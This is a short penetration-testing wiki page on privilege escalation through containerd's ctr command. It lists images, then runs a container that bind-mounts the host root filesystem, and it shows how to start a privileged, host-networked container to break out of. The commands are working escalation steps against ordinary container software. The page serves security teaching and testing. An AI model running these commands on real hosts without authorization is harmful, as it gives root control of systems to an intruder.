# Containerd \(ctr\) Privilege Escalation

## Basic information

Go to the following link to learn **what is containerd** and `ctr`:

{% page-ref page="../../pentesting/2375-pentesting-docker.md" %}

## PE 1

if you find that a host contains the `ctr` command:

```bash
which ctr
/usr/bin/ctr
```

You can list the images:

```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS 
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -      
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -      
```

And then **run one of those images mounting the host root folder to it**:

```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```

## PE 2

Run a container privileged and escape from it.  
You can run a privileged container as:

```bash
 ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```

Then you can use some of the techniques mentioned in the following page to **escape from it abusing privileged capabilities**:

{% page-ref page="docker-breakout.md" %}

